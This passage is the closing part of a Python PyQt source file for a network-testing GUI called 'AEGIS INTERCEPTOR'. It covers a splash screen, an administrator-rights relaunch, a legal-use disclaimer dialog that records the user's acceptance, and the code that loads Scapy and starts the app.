        time.sleep(0.5)
        self.finished.emit(SCAPY_AVAILABLE)

class SplashScreen(QWidget):
    def __init__(self):
        super().__init__()
        self.setFixedSize(400, 250)
        self.setWindowFlag(Qt.WindowType.FramelessWindowHint)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        
        layout = QVBoxLayout(self)
        self.setStyleSheet(f"""
            QWidget {{ background-color: {THEME['bg_app']}; border: 1px solid {THEME['accent']}; border-radius: 10px; }}
            QLabel {{ color: {THEME['text_p']}; font-family: Consolas; }}
        """)
        
        title = QLabel("AEGIS INTERCEPTOR")
        title.setStyleSheet(f"font-size: 20pt; font-weight: bold; color: {THEME['accent']}; border: none;")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        self.lbl_status = QLabel("Initializing...")
        self.lbl_status.setStyleSheet("font-size: 10pt; color: #809795; border: none;")
        self.lbl_status.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        self.progress = QProgressBar()
        self.progress.setStyleSheet(f"""
            QProgressBar {{ border: none; background-color: {THEME['bg_card']}; height: 4px; border-radius: 2px; }}
            QProgressBar::chunk {{ background-color: {THEME['accent']}; border-radius: 2px; }}
        """)
        self.progress.setRange(0, 0) # Infinite loading animation
        
        layout.addWidget(title)
        layout.addStretch()
        layout.addWidget(self.lbl_status)
        layout.addWidget(self.progress)
        layout.addStretch()

# ==========================================
# ENTRY POINT
# ==========================================
if __name__ == "__main__":
    multiprocessing.freeze_support()
    
    # Admin Check
    if not is_admin():
        if platform.system() == 'Windows':
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        else:
            print("Root privileges required.")
        sys.exit(0)
        
    app = QApplication(sys.argv)
    
    # ==========================================
    # COMPLIANCE & LEGAL GATEKEEPER
    # ==========================================
    DISCLAIMER_FILE = "aegis_agreement.txt"
    
    if not os.path.exists(DISCLAIMER_FILE):
        msg = QMessageBox()
        msg.setWindowTitle("Legal Notice")
        msg.setText(
            "AEGIS INTERCEPTOR is a network testing tool.\n\n"
            "Use ONLY on networks you own or have explicit written permission to test.\n\n"
            "Unauthorized interception of communications is illegal in most countries.\n"
            "The author assumes no liability for misuse."
        )
        msg.setIcon(QMessageBox.Icon.Warning)
        msg.setStandardButtons(QMessageBox.StandardButton.Ok | QMessageBox.StandardButton.Cancel)
        
        # Rename "Ok" button to "I Accept"
        btn_accept = msg.button(QMessageBox.StandardButton.Ok)
        btn_accept.setText("I Accept")
        
        reply = msg.exec()
        
        if reply == QMessageBox.StandardButton.Ok:
            try:
                with open(DISCLAIMER_FILE, 'w') as f:
                    f.write(f"Agreement accepted by user on {datetime.now()}")
            except Exception as e:
                QMessageBox.critical(None, "Error", f"Could not save agreement file: {e}")
                sys.exit(1)
        else:
            sys.exit(0)

    # ==========================================
    # APP LAUNCH
    # ==========================================
    # 1. Show Splash Screen
    splash = SplashScreen()
    splash.show()
    
    # 2. Start Loading Dependencies in Background
    loader = DependencyLoader()
    
    def on_loaded(scapy_loaded):
        # 3. Once loaded, close splash and show Main Window
        global win
        splash.close()
        win = AegisWindow() 
        if not scapy_loaded:
            QMessageBox.critical(win, "Dependency Error", "Scapy not found. Some features will be disabled.")
        win.show()
    
    loader.status.connect(splash.lbl_status.setText)
    loader.finished.connect(on_loaded)
    loader.start()
    
    sys.exit(app.exec())
